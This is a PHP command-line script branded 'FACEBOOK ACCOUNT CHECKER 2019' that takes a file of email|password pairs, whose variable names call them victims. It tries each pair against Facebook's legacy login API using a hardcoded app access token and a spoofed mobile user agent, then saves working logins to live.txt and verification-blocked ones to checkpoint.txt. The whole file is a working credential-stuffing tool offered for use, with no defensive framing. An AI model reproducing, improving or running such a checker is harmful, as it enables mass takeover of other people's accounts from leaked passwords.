<?php

$biru = "\e[34m";
$kuning = "\e[33m";
$cyan = "\e[96m";
$magenta = "\e[35m";
$hijau = "\e[92m";
$merah = "\e[91m";
echo "$cyan + //////////////////////////////+\n";
echo "$cyan ___           _     _
|_ _|_ __  ___(_) __| | ___
 | || '_ \/ __| |/ _` |/ _ \
 | || | | \__ \ | (_| |  __/
|___|_| |_|___/_|\__,_|\___|\n";
echo "_   _                 _
| | | | ___  __ _ _ __| |_ ____
| |_| |/ _ \/ _` | '__| __|_  /
|  _  |  __/ (_| | |  | |_ / /
|_| |_|\___|\__,_|_|   \__/___|\n\n";
echo "+ //////////////////////////////+\n";
echo " FACEBOOK ACCOUNT CHECKER 2019 \n";
echo "+ //////////////////////////////+\n";


if(isset($argv[1])) {
    if(file_exists($argv[1])) {
        $cokot = explode(PHP_EOL, file_get_contents($argv[1]));
        foreach($cokot as $iyeukorbannaatawalistna) {
            $potong = explode("|", $iyeukorbannaatawalistna);
            nyobianAkun($potong[0], $potong[1]);
          
        }
    }else die("File doesn't exist!");
}else die("$merah Usage: php fbcheck.php targets.txt \n");
function nyobianAkun($emailnaetateh, $iyeutehsandina) {
    $asaltisakabehna = array(
        "access_token" => "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "email" => $emailnaetateh,
        "password" => $iyeutehsandina,
        "locale" => "en_US",
        "format" => "JSON"
    );
    $sig = "";
    foreach($asaltisakabehna as $key => $value) { $sig .= $key."=".$value; }
    $sig = md5($sig);
    $asaltisakabehna['sig'] = $sig;
    $ch = curl_init("https://api.facebook.com/method/auth.login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $asaltisakabehna);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10");
    $hasilnatidiyeulurrr = json_decode(curl_exec($ch));
    
     sleep(1);
echo "\e[34m =>\e[34m ";
    $emailjeungpasswordnangahiji =  $emailnaetateh."|".$iyeutehsandina;
    if(isset($hasilnatidiyeulurrr->access_token)) { 
    	 echo $hijau;
        echo $emailjeungpasswordnangahiji."  \e[33m [LIVE]".PHP_EOL;
        file_put_contents("live.txt", $emailjeungpasswordnangahiji.PHP_EOL, FILE_APPEND);
    }elseif($hasilnatidiyeulurrr->error_code == 405 || preg_match("/User must verify their account/i", $hasilnatidiyeulurrr->error_msg)) {
        echo $merah;
echo  $emailjeungpasswordnangahiji."\e[91m [CHECKPOINT]\e[34m".PHP_EOL;
        file_put_contents("checkpoint.txt", $emailjeungpasswordnangahiji.PHP_EOL, FILE_APPEND);
    }else echo  $emailjeungpasswordnangahiji."\e[91m  [DEAD]\e[34m".PHP_EOL;
}
